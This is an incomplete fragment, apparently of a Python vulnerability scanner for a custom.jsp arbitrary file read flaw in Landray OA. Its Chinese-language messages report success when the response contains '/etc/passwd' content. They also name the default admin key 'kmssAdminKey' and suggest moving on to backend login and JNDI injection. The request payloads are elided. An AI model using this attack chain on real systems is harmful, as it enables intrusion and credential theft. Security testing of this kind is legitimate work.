...
def main(target_url):
    ...
    print(now_time() + " [INFO]     正在检测蓝凌OA custom.jsp 任意文件读取漏洞")
    try:
        ...
        if (respones1.status_code == 200 and 'root:' in respones1.text) or (
            ...
            print(now_time() + ' [SUCCESS]  蓝凌OA custom.jsp 任意文件读取漏洞存在:{}'.format(exp_url))
            print(now_time() + ' [SUCCESS]  post输入的参数为:{}'.format(data))
            print(now_time() + ' [SUCCESS]  post输入的参数为:{}'.format(data1))
            print(
                now_time() + ' [SUCCESS]  请手工测试返回值，若存在admin.properties AES加密，且 默认密钥为 kmssAdminKey 登录后台可进行jndi注入测试')
        else:
            print(now_time() + ' [WARNING]  蓝凌OA custom.jsp 任意文件读取漏洞不存在')
    except:
